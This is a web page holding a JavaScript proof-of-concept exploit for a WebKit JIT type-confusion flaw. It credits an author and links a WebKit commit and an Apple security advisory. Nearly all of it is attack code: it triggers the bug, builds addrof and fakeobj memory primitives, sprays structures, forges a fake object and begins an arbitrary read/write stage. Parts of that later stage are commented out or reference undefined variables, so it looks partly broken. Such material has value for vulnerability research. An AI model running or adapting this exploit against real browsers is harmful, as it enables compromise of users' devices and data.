<!DOCTYPE html>
<html>
    <head>
        <style>
            body {
                font-family: 'Courier New', Courier, monospace;
                font-size: 4rem;
            }
        </style>
    </head>
<body>
<script src="util.js"></script>
<script src="int64.js"></script>
<script>
/*
author: @po6ix
commit: https://github.com/WebKit/WebKit/commit/08d5d17c766ffc7ca6a7c833c5720eb71b427784
advisory: https://support.apple.com/en-us/HT213926
*/

let boxed_arr = new Function();
boxed_arr.p1 = 1.1;
boxed_arr[0] = {};

let getter = new Function();
getter.p1 = 1.1;
getter[0] = 1.1;

let shape = {};
for (let i = 0; i < 14; ++i) {
    shape['p'+i] = i;
}

let shapes = [];
for (let i = 0; i < 100; ++i) {
    shapes.push({
        ...shape,
        ['z'+i]: 0x1337
    });
}

function trigger(type) {
    let object_a = {};
    object_a.foo = 1;
    object_a.p1 = 1.1;

    let object_b = {};
    object_b.__defineGetter__('p1', getter);
    object_b.foo = 1;

    function get_getterSetter(type) {
        let o, retval;

        if (type == 0) o = object_a;
        else o = object_b;

        for (let i = 0; i < 2; ++i) {
            if (type == 0) retval = o.foo;
            else retval = o.foo;
        }
        return retval;
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }

    return [getter, get_getterSetter(1)];
}


(function pwn() {
    let [getter, getterSetter] = trigger();
    let success = false;
    try {
        getterSetter.toString();
    } catch(e) {
        // it should fail to call toString
        success = true;
    }
    if (!success) {
        alert('failed to get getterSetter');
        return;
    }

    let symbolObject = Object(getterSetter);

    let ref_arr = [];
    for (let i = 0; i < 87; ++i) {
        ref_arr.push(symbolObject.description);
    }

    getter.p13 = 1.1; // change the length of boxed_arr
    let unboxed_arr = getter;
    
    function addrof(o) {
        boxed_arr[8] = o;
        // return unboxed_arr[0];
        return Int64.fromDouble(unboxed_arr[0]);
    }

    function fakeobj(addr) {
        unboxed_arr[0] = addr.asDouble();
        // unboxed_arr[0] = addr;
        return boxed_arr[8];
    }
    
    function lol() {
        ITERS = 10000
        ALLOCS = 1000

        var conversion_buffer = new ArrayBuffer(8)
        var f64 = new Float64Array(conversion_buffer)
        var i32 = new Uint32Array(conversion_buffer)

        var BASE32 = 0x100000000
        function f2i(f) {
            f64[0] = f
            return i32[0] + BASE32 * i32[1]
        }

        function i2f(i) {
            i32[0] = i % BASE32
            i32[1] = i / BASE32
            return f64[0]
        }

        function hex(x) {
            if (x < 0)
                return `-${hex(-x)}`
            return `0x${x.toString(16)}`
        }

        function xor(a, b) {
            var res = 0, base = 1
            for (var i = 0; i < 64; ++i) {
                res += base * ((a&1) ^ (b&1))
                a = (a-(a&1))/2
                b = (b-(b&1))/2
                base *= 2
            }
            return res
        }

        function fail(x) {
            log('FAIL ' + x)
            throw null
        }
        log("stage 2");
        var structure_spray = []
        for (var i = 0; i < 1000; ++i) {
            var ary = {a:1,b:2,c:3,d:4,e:5,f:6,g:0xfffffff}
            ary['prop'+i] = 1
            structure_spray.push(ary)
        }
    
        var manager = structure_spray[500]
        var leak_addr = addrof(manager)
        //log('leaking from: '+ hex(leak_addr))
    
        function alloc_above_manager(expr) {
            var res
            do {
                for (var i = 0; i < ALLOCS; ++i) {
                    structure_spray.push(eval(expr))
                }
                res = eval(expr)
            } while (addrof(res) < leak_addr)
            return res
        }
    
        var unboxed_size = 100
    
        var unboxed = alloc_above_manager('[' + '13.37,'.repeat(unboxed_size) + ']')
        var boxed = alloc_above_manager('[{}]')
        var victim = alloc_above_manager('[]')
    
        // Will be stored out-of-line at butterfly - 0x10
        victim.p0 = 0x1337
        function victim_write(val) {
            victim.p0 = val
        }
        function victim_read() {
            return victim.p0
        }
    
        i32[0] = 0x200                // Structure ID
        i32[1] = 0x01082007 - 0x10000 // Fake JSCell metadata, adjusted for boxing
        var outer = {
            p0: 0, // Padding, so that the rest of inline properties are 16-byte aligned
            p1: f64[0],
            p2: manager,
            p3: 0xfffffff, // Butterfly indexing mask
        }
    
        var fake_addr = Add(addrof(outer), 0x20)
        log('fake obj @ ' + fake_addr)
    
        var unboxed_addr = addrof(unboxed)
        var boxed_addr = addrof(boxed)
        var victim_addr = addrof(victim)
        // log('leak ' + leak_addr
        //     + '\nunboxed ' + unboxed_addr
        //     + '\nboxed ' + boxed_addr
        //     + '\nvictim ' + victim_addr
        // )
        var holder = {fake: {}}
        holder.fake = fakeobj(fake_addr)
    
        // From here on GC would be uncool
        log("hard part")
        var cat = (Sub(Add(unboxed_addr, 8), leak_addr) / 8)
        // log(apple);
        // log(banana);
        log(cat);
        //var shared_butterfly = holder.fake[cat]
        //var victim_butterfly = holder.fake[(victim_addr + 8 - leak_addr) / 8]
        log('shared_butterfly ' + shared_butterfly)
        //log('victim_butterfly ' + victim_butterfly)
        // function set_victim_addr(where) {
        //     holder.fake[(victim_addr + 8 - leak_addr) / 8] = i2f(where + 0x10)
        // }
        // function reset_victim_addr() {
        //     holder.fake[(victim_addr + 8 - leak_addr) / 8] = victim_butterfly
        // }
    
        var stage2 = {
            addrof: function(victim) {
                boxed[0] = victim
                return unboxed[0]
            },
    
            fakeobj: function(addr) {
                unboxed[0] = addr
                return boxed[0]
            },
    
            write64: function(where, what) {
                set_victim_addr(where)
                victim_write(this.fakeobj(what))
                reset_victim_addr()
            },
    
            read64: function(where) {
                set_victim_addr(where)
                var res = this.addrof(victim_read())
                reset_victim_addr()
                return res
            },
    
            write_non_zero: function(where, values) {
                for (var i = 0; i < values.length; ++i) {
                    if (values[i] != 0)
                        this.write64(Add(where, i*8), values[i])
                }
            },
    
            test: function() {
                this.write64(Add(boxed_addr + 16), 0xfff) // Overwrite index mask, no biggie
                if (0xfff != this.read64(Add(boxed_addr, 16))) {
                    fail(2)
                }
            },
    
            forge: function(values) {
                for (var i = 0; i < values.length; ++i)
                    unboxed[1 + i] = i2f(values[i])
                return shared_butterfly + 8
            },
    
            clear: function() {
                outer = null
                holder.fake = null
                for (var i = 0; i < unboxed_size; ++i)
                    boxed[0] = null
            },
        }
    
        // Test read/write
        // stage2.test()
        log("done");
    }

        log(`success!!!`);

        // testobject = {};
        // testobject.a = 1;
        // testobject.b = 2;
        // testobject.c = 3;
        // log("testobject addr: " + addrof(testobject).toString() + "<br>testobject properties: ");
        // Object.values(testobject).forEach((prop)=> log(prop));
        // testobjectfake = fakeobj(addrof(testobject));
        // testobjectfake.b = "we out here";
        // testobjectfake.c = 1337;
        // log("<br>fake object addr: " + addrof(testobjectfake).toString() + "<br>fakeobject edited testobject properties:");
        // Object.values(testobject).forEach((prop)=> log(prop));
        lol();
})();
</script>

</body>
</html>